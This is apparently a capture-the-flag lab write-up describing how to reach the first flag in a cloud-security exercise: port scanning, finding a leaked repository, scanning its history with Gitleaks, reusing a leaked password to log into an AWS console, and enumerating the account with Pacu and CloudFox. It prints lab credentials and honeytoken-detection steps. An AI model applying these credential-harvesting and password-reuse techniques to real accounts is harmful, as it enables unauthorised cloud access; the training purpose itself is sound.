---
title: Thunderdome - Flag 1 - Emerge Through the Breach
parent: UI Components
nav_order: 1
---

# Thunderdome - Flag 1 - Emerge Through the Breach
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---
# Flag 1 - Emerge Through the Breach

## Starting point - `44.208.228.94`

### Scan the given IP address

Run `nmap`, `rustscan`, `masscan` or your port scanner of choice. You just need to run a tool with options that give you a reliable scan.

```bash
└─# nmap -v -Pn -sCV -T4 -oN nmap.out
<snip>
Nmap scan report for ec2-44-208-228-94.compute-1.amazonaws.com (44.208.228.94)
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c8:6f:39:1c:83:ea:52:7a:79:5f:f5:d6:41:fb:1f:b5 (ECDSA)
|_  256 2d:1a:e5:1c:b5:35:b8:71:03:4b:16:78:d4:b4:87:79 (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Massive Pharma | Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp open  http    Apache httpd 2.4.52
|_http-title: Massive Pharma | Home
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: ip-172-31-90-229.ec2.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
<snip>

```

### Quick breakdown on flags

I'm not going to go into a lot of detail, there are plenty of Nmap tutorials out there, also the official docs.

- `v` - verbose output in real time.
- `Pn` - skip host discovery (useful if ping requests are blocked)
- `sCV` - `C` - detect common vulnerabilities, `V` - detect versions
- `T4` - timing template - `T1` is slowest and stealthiest and `T5` is the most aggressive - fastest but noisiest and may overwhelm a host. Lower timings can provide more accurate results
- `oN` - normal output (as opposed to XML or `grep`able
- You can use `A` instead of `sCV` to give you OS versions (if detected) and `traceroute` output as well as what `sCV` provides

The Nmap output shows a few interesting things

- Ports `22`, `80` and `443` are open
- `HTTP` is being served on port `443` which is not a standard configuration
- `44.208.228.94` resolves to `ec2-44-208-228-94.compute-1.amazonaws.com`

From `ec2-44-208-228-94.compute-1.amazonaws.com` we know we are dealing with an AWS EC2 instance.

### Rustscan

You can do a quick scan with `rustscan` to get an idea of open ports (which can be more reliable than `nmap`). `Rustscan` passes findings to `nmap` so  you can use something like `rustscan -a 44.208.228.94 -- -sCV -Pn`, use `--` then state `nmap` flags. For more information on usage see [https://github.com/RustScan/RustScan/wiki/Things-you-may-want-to-do-with-RustScan-but-don't-understand-how](https://github.com/RustScan/RustScan/wiki/Things-you-may-want-to-do-with-RustScan-but-don't-understand-how).

```bash
└─# rustscan -a 44.208.228.94
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <http://discord.skerritt.blog>           :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 44.208.228.94:22
Open 44.208.228.94:80
Open 44.208.228.94:443

```

## ip2cloud

If we didn't get any Cloud provider information from the `nmap` scan we could also have used something like `ip2cloud` which maps IPs to Cloud provider ranges - [https://github.com/devanshbatham/ip2cloud](https://github.com/devanshbatham/ip2cloud).

```bash
└─# echo 44.208.228.94 | ip2cloud
[aws] : 44.208.228.94

```

### ip2provider

There's also `ip2provider` - [https://github.com/oldrho/ip2provider](https://github.com/oldrho/ip2provider).

```bash
└─# ./ip2provider.py 44.208.228.94
44.208.228.94 aws AMAZON us-east-1

```

We know we're dealing with an AWS host serving web traffic. You may be thinking "well I could have just run `nslookup` and determined this was an EC2 instance." Well, `nslookup` won't always reveal whether a host is a Cloud VM - custom DNS records and internal naming conventions may obsure this fact. In addition, scripts like `ip2provider` accept bulk IP addresses in a file so you can quickly lookup a number of potential hosts.

## Checkout what is being served at `44.208.228.94`

![img]({{ '/assets/images/flag1/Untitled.png' | relative_url }}){: .center-image }

It's a health care website. The menu links return to the main page. I checked for the usual `robots.txt, .git/, backup[s], admin, api`, etc. Even checked for `flag.txt` (wishful thinking!)

## Page source

Looking at the page source is always a good idea, you might find useful hidden field values or comments. Examining the source for the site we see this `<!-- <http://bitbucket.org/massive-pharma/mp-website> -->`:

![img]({{ '/assets/images/flag1/Untitled 1.png' | relative_url }}){: .center-image }

We'll save that and check it out in a bit.

## Enumeration

The `nmap` output shows the host is running Linux and the site is being served via Apache. This is useful to know when looking for potential files with certain extensions (e.g., what you would expect to find hosted on an IIS box vs Apache box). The key point is use some intelligence in your enumeration for better results. I ran `ffuz` to fuzz subdirectories as a starting point, but then also `feroxbuster` (because it looks cool).

### Ffuf

Various options and flags for `ffuf` are covered in a bunch of tutorials and walkthroughs, you don't need anything particular for this step. I used a bog-standard `dirbuster` wordlist:

`└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://44.208.228.94/FUZZ`

![img]({{ '/assets/images/flag1/Untitled 2.png' | relative_url }}){: .center-image }

Nothing to pursue in `assets` or `portal` directories. `server-status` may have been a rabbit hole (returns a `403`). I was able to progress the CTF without investigating this. I thought it might have been a page where I could reference an endpoint or host to check its status (I was thinking Instance Metadata Service (IMDS) SSRF).

### Feroxbuster

I ran `feroxbuster` (as I like to compare results between tools) which used the `seclists` wordlist `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`. I added some typical file extensions to look for (`php`, `html`, `json`, `txt`). Interestingly, it didn't find the `server-status` page:

![img]({{ '/assets/images/flag1/Untitled 3.png' | relative_url }}){: .center-image }

## HTTP on 443

I tried to browse and enumerate `http://44.208.228.94:443/` as well, but didn't find anything remarkable.

## Back to page source finding

Let's have a look at the Bitbucket link we found in the page source `<!-- <http://bitbucket.org/massive-pharma/mp-website> -->`. This is what we see

![img]({{ '/assets/images/flag1/Untitled 4.png' | relative_url }}){: .center-image }

Note the highlighted link above. Click on that link to get a list of all repositories

![img]({{ '/assets/images/flag1/Untitled 5.png' | relative_url }}){: .center-image }

Let's have a look at the first one - `trial-data-management-poc`. We can see a bunch of commits. It would be a good idea to have a look through them to see if any sensitive information or credentials are (or were at some point) exposed.

![img]({{ '/assets/images/flag1/Untitled 6.png' | relative_url }}){: .center-image }

## Gitleaks

It's worth scanning the repo to look for things like hard-coded secrets. You can use something like Gitleaks - [https://github.com/gitleaks/gitleaks](https://github.com/gitleaks/gitleaks).

### Get Gitleaks docker image

### Pull the image

`docker pull zricethezav/gitleaks`

![img]({{ '/assets/images/flag1/Untitled 7.png' | relative_url }}){: .center-image }

### Test it's working

`docker run --rm --name=gitleaks zricethezav/gitleaks detect --help` 

![img]({{ '/assets/images/flag1/Untitled 8.png' | relative_url }}){: .center-image }

## Clone `trial-data-management-poc` repo

Clone the `trial-data-management-poc` repository from the Bitbucket site (click on the `Clone` button)

![img]({{ '/assets/images/flag1/Untitled 9.png' | relative_url }}){: .center-image }

![img]({{ '/assets/images/flag1/Untitled 10.png' | relative_url }}){: .center-image }

## Scan repo

> Change the path below to where the trial-data-management-poc repository was cloned on your machine
> 

```bash
└─# docker run --rm -v /root/thunderdome/flag1/trial-data-management-poc:/tmp/scan --name=gitleaks zricethezav/gitleaks detect -v --source /tmp/scan

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

Finding:     'key'    => 'AKIATCKANV3QK3BT3CVG',
Secret:      AKIATCKANV3QK3BT3CVG
RuleID:      aws-access-token
Entropy:     3.308695
File:        tests/uploader/data-uploader.php
Line:        11
Commit:      c167543e30628c5a76f79f519a0adb752b238106
Author:      Haru Sato
Email:       haru@massive-pharma.com
Date:        2024-01-25T22:14:55Z
Fingerprint: c167543e30628c5a76f79f519a0adb752b238106:tests/uploader/data-uploader.php:aws-access-token:11

Finding:     "access_token":"d2870cb522230dbb8946b2f47d2c7e6664656661756c74"
Secret:      d2870cb522230dbb8946b2f47d2c7e6664656661756c74
RuleID:      generic-api-key
Entropy:     3.568923
File:        API_README.md
Line:        46
Commit:      63c14dbeed5cc62c8488f3cfca0c78b882a63262
Author:      Nina Lopez
Email:       nina@massive-pharma.com
Date:        2024-01-24T00:49:08Z
Fingerprint: 63c14dbeed5cc62c8488f3cfca0c78b882a63262:API_README.md:generic-api-key:46

Finding:     -----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDlV6kAVW/oI8ab
F1vai3Q...
Secret:      -----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDlV6kAVW/oI8ab
F1vai3Q...
RuleID:      private-key
Entropy:     6.023098
File:        contrib/util/docker/dockers/dev-nginx/dummy-key
Line:        1
Commit:      63c14dbeed5cc62c8488f3cfca0c78b882a63262
Author:      Nina Lopez
Email:       nina@massive-pharma.com
Date:        2024-01-24T00:49:08Z
Fingerprint: 63c14dbeed5cc62c8488f3cfca0c78b882a63262:contrib/util/docker/dockers/dev-nginx/dummy-key:private-key:1

Finding:     ...n--;break;case t.ui.keyCode.END:n=this.anchors.length-1;break;case t.ui.keyC...
Secret:      n=this.anchors.length-1
RuleID:      generic-api-key
Entropy:     3.849224
File:        public/assets/jquery-ui-1-10-4/ui/minified/jquery.ui.tabs.min.js
Line:        4
Commit:      63c14dbeed5cc62c8488f3cfca0c78b882a63262
Author:      Nina Lopez
Email:       nina@massive-pharma.com
Date:        2024-01-24T00:49:08Z
Fingerprint: 63c14dbeed5cc62c8488f3cfca0c78b882a63262:public/assets/jquery-ui-1-10-4/ui/minified/jquery.ui.tabs.min.js:generic-api-key:4

```

Gitleaks found a bunch of stuff but there may be a few false positives. Let's have a quick look at one of the findings.

> Make sure you're in the `trial-data-management-poc`  directory
> 

`git log -L <Line>,<Line>:<File> <Commit>` - fill in these details from the output above.

```bash
└─# git log -L 11,11:tests/uploader/data-uploader.php c167543e30628c5a76f79f519a0adb752b238106
commit c167543e30628c5a76f79f519a0adb752b238106
Author: Haru Sato <haru@massive-pharma.com>
Date:   Thu Jan 25 22:14:55 2024 +0000

    Bucket name change

diff --git a/tests/uploader/data-uploader.php b/tests/uploader/data-uploader.php
--- a/tests/uploader/data-uploader.php
+++ b/tests/uploader/data-uploader.php
@@ -11,1 +11,1 @@
-        'key'    => '',
+        'key'    => 'AKIATCKANV3QK3BT3CVG',

commit b2ab2e4c1417f359e695410a11ff52a54c5bc161
Author: Haru Sato <haru@massive-pharma.com>
Date:   Wed Jan 24 01:41:49 2024 +0000

    Update

diff --git a/tests/uploader/data-uploader.php b/tests/uploader/data-uploader.php
--- /dev/null
+++ b/tests/uploader/data-uploader.php
@@ -0,0 +11,1 @@
+        'key'    => '',

```

There are a couple of things we can potentially leverage - there's an email and also mention of a "key". Let's get a list of all commits and who made them so we can have a thorough look, as secrets scanning tools can sometimes produce false negatives, i.e., not report something when it should.

## List of commits

```bash
└─# git log --all --format='%H - %an %ae - %s'

14129237ea34eeefbced772092c9264f60b2cefa - hsato hsato@MacBook.local - Pushing local changes
980560b9e9b952f145b8db29265e7c645e57031e - Nina Lopez nina@massive-pharma.com - Update
c167543e30628c5a76f79f519a0adb752b238106 - Haru Sato haru@massive-pharma.com - Bucket name change
b2ab2e4c1417f359e695410a11ff52a54c5bc161 - Haru Sato haru@massive-pharma.com - Update
63c14dbeed5cc62c8488f3cfca0c78b882a63262 - Nina Lopez nina@massive-pharma.com - Initial Commit
56dfb0d1b4105f715fa754d35d342fc804d1093b - Nina Lopez nina@massive-pharma.com - Initial commit

```

There aren't many commits so we can examine each one until we find something interesting:

## Looking through commits

```bash
└─# git show 14129237ea34eeefbced772092c9264f60b2cefa
commit 14129237ea34eeefbced772092c9264f60b2cefa (HEAD -> main, origin/main, origin/HEAD)
Author: hsato <hsato@MacBook.local>
Date:   Tue Apr 23 16:38:20 2024 +0100

<snip>

+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=laravel
+DB_USERNAME=root
+DB_PASSWORD=Treatment!

<snip>

```

Interesting to note that Gitleaks didn't pick up the password found above - `Treatment!`. This may be because many secrets detection tools rely heavily on finding high entropy (randomness) items, and it's an example of a false negative.

### Tangent alert

> I've encountered examples similar to the above in a DevSecOps context with tools such as TruffleHog. These tools work with a regular expression engine which must be tuned to your needs, striking a balance between false positives and false negatives. When committing code, depending the size of the pull request, a four-eyes approach (two people checking) with mandatory approvers (separation of duties principle) can spot things tools may miss (because they lack the context - let's not tangent to AI!). This highlights security transcends tools - it's about people, process and tools.
> 

Anyway, going through the commits as above, we find the following interesting items:

`Treatment!` - password from commit `14129237ea34eeefbced772092c9264f60b2cefaAKIATCKANV3QK3BT3CVG` - AWS Access Key from commit `c167543e30628c5a76f79f519a0adb752b238106haru@massive-pharma.com` - from list of commits
`nina@massive-pharma.com` - from list of commits
`mp-clinical-trial-data`- bucket name from commit `c167543e30628c5a76f79f519a0adb752b238106`

## What can we do with the above?

An AWS access key is not much good without the corresponding secret access key, but not entirely useless... you can ascertain the AWS account associated with an AWS access key if you have an AWS account and are authenticated via the `aws cli`. To authenticate via the cli run `aws configure`, then when prompted, enter an AWS access key and secret access key generated for a user in your AWS account. You can run then following command:

```bash
└─# aws sts get-access-key-info --access-key-id AKIATCKANV3QK3BT3CVG
{
    "Account": "211125382880"
}

```

## Recap

We now have:

- 2 usernames - `haru@massive-pharma.com` and `nina@massive-pharma.com`
- A password - `Treatment!`
- An account ID - `211125382880`

At this point, we have enough to try and log in to the AWS portal. There are only two names to try, but I think we should use `haru`'s username first as the password `Treatment!` was found in one of his commits, and we should always check for password reuse. Haru used it for the database password, he may also use it for his console password.

![img]({{ '/assets/images/flag1/Untitled 11.png' | relative_url }}){: .center-image }

We manage to log in successfully! Upon looking at the recently visited services, one stands out over the others as potential place for a flag:

![img]({{ '/assets/images/flag1/Untitled 12.png' | relative_url }}){: .center-image }

When we go to Secrets Manger we see the following:

![img]({{ '/assets/images/flag1/Untitled 13.png' | relative_url }}){: .center-image }

## Grab the loot:

Click on `flag` and "Retrieve secret value" in the "Secret value" pane:

![img]({{ '/assets/images/flag1/Untitled 14.png' | relative_url }}){: .center-image }

And there's the first flag! But we're not done yet. We need to grab anything that will help us move laterally within Massive Pharma or discover new services leading to the next flag. Remember the other secret - `aws/haru`? Let's have a look at that:

![img]({{ '/assets/images/flag1/Untitled 15.png' | relative_url }}){: .center-image }

ACCESS_KEY_ID - `AKIATCKANV3QK3BT3CVG`
SECRET_ACCESS_KEY - `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`

## Poke the key with `Pacu`

For fun, let's double check the access key is actually associated with Haru - yes you can check this via `aws sts get-caller-identity` but we can also check the access key is not a troll key (yeah Pwnedlabs would do that).

Fire up `pacu`, and run `set_keys` to add the access key and secret access key. You can also run `import_keys <profile>` if you have the keys in your `.aws/credentials` file.

```
Pacu (flag1:No Keys Set) > set_keys
Setting AWS Keys...
Press enter to keep the value currently stored.
Enter the letter C to clear the value, rather than set it.
If you enter an existing key_alias, that key's fields will be updated instead of added.
Key alias must be at least 2 characters

Key alias [None]: haru
Access key ID [None]: AKIATCKANV3QK3BT3CVG
Secret access key [None]: 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
Session token (Optional - for temp AWS keys only) [None]:

Keys saved to database.

Pacu (flag1:haru) > run iam__detect_honeytokens
  Running module iam__detect_honeytokens...
[iam__detect_honeytokens] Making test API request...

[iam__detect_honeytokens]   Keys appear to be real (not honeytoken keys)!

[iam__detect_honeytokens] iam__detect_honeytokens completed.

[iam__detect_honeytokens] MODULE SUMMARY:

  Keys appear to be real (not honeytoken keys)!

  Full ARN for the active keys (saved to database as well):

    arn:aws:iam::211125382880:user/haru@massive-pharma.com

```

We can see the access key is associated with `haru@massive-pharma.com`.  For more information on honey-token detection see here - [https://rhinosecuritylabs.com/cloud-security/cloudgoat-detection_evasion-walkthrough/](https://rhinosecuritylabs.com/cloud-security/cloudgoat-detection_evasion-walkthrough/), and here - [https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Honey-token example

For a quick test, hop over to [https://canarytokens.org/generate](https://canarytokens.org/generate), create an "AWS keys" canary token and test it in `pacu`.

```
Pacu (flag1:can) > run iam__detect_honeytokens
  Running module iam__detect_honeytokens...
[iam__detect_honeytokens] Making test API request...

[iam__detect_honeytokens]   WARNING: Keys are confirmed honeytoken keys fr

[iam__detect_honeytokens] iam__detect_honeytokens completed.

[iam__detect_honeytokens] MODULE SUMMARY:

  WARNING: Keys are confirmed honeytoken keys from Canarytokens.org! Do no

  Full ARN for the active keys (saved to database as well):

    arn:aws:iam::992382622183:user/canarytokens.com@@ckbx3zaxtuckg5417k8ys

```

### Remember getting the account ID from an access key earlier?

Previously we looked at how to ascertain the AWS account belonging to an AWS access key with `aws sts get-access-key-info --access-key-id AKIATCKANV3QK3BT3CVG`. If you had `pacu` running already as part of your toolset for the CTF you could have used the `iam__decode_accesskey_id` module:

```
Pacu (flag1:haru) > run iam__decode_accesskey_id AKIATCKANV3QK3BT3CVG
  Running module iam__decode_accesskey_id...
[iam__decode_accesskey_id] iam__decode_accesskey_id completed.

[iam__decode_accesskey_id] MODULE SUMMARY:

Account ID: 211125382880

```

## Situational awareness

Let's use this access key to see what else we can discover in the AWS account:

```bash
└─# aws configure --profile haru
AWS Access Key ID [None]: AKIATCKANV3QK3BT3CVG
AWS Secret Access Key [None]: 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
Default region name [None]:
Default output format [None]:

```

I like to use a tool called `CloudFox` to gain AWS situational awareness if I find an AWS access key and secret access key - [https://github.com/BishopFox/cloudfox](https://github.com/BishopFox/cloudfox). Once installed, run it as follows, specifying `all-checks` and `--profile haru`, which is the AWS profile we created above. We're using `all-checks` because it's better to have a whole bunch of information we can sift through and eliminate, than missing out on something crucial and having to retrace our steps.

```
└─# cloudfox aws --profile haru all-checks

```

Once CloudFox has completed its operations, one of the first things to examine is the inventory it has discovered. This inventory is essentially a list of resources for which the user associated with the access key has some level of permissions. CloudFox tells you where it dumps data:

```
[🦊 cloudfox v1.14.0 🦊 ][haru] Cached AWS data written to /root/.cloudfox/cached-data/aws/211125382880

```

```bash
└─# ls -l /root/.cloudfox/cloudfox-output/aws/haru-211125382880/
total 16
drwx------ 2 root root 4096 May 16 17:41 csv
drwx------ 2 root root 4096 May 16 17:41 json
drwxr-xr-x 2 root root 4096 May 16 17:41 loot
drwx------ 2 root root 4096 May 16 17:41 table

```

Let's dump the inventory in the `loot` folder:

```bash
└─# cat /root/.cloudfox/cloudfox-output/aws/haru-211125382880/loot/inventory.txt
arn:aws:iam::211125382880:user/detective-user
arn:aws:iam::211125382880:user/haru@massive-pharma.com
arn:aws:iam::211125382880:user/nacer@massive-pharma.com
arn:aws:iam::211125382880:user/nina@massive-pharma.com
arn:aws:iam::211125382880:user/sven@massive-pharma.com
arn:aws:ec2:us-east-1:211125382880:image/ami-00568b27b974ba617
arn:aws:ec2:us-east-1:211125382880:snapshot/snap-0c241b0d00d234853
arn:aws:ec2:us-east-1:211125382880:instance/i-0874ad63d9693239c
arn:aws:ec2:us-east-1:211125382880:instance/i-0d67cb27d5cc12605
arn:aws:ec2:us-east-1:211125382880:volume/vol-05ada6051c8801cad
arn:aws:ec2:us-east-1:211125382880:volume/vol-06ca35e92e87b4aac
arn:aws:secretsmanager:us-east-1:211125382880:secret:flag-6LBCtw
arn:aws:secretsmanager:us-east-1:211125382880:secret:aws/haru-yQP4Jm

```

Make a note of the above, it's a snapshot (ahem) of what you'll need for the next flag!

[Backup](https://www.notion.so/Backup-bfd7ef
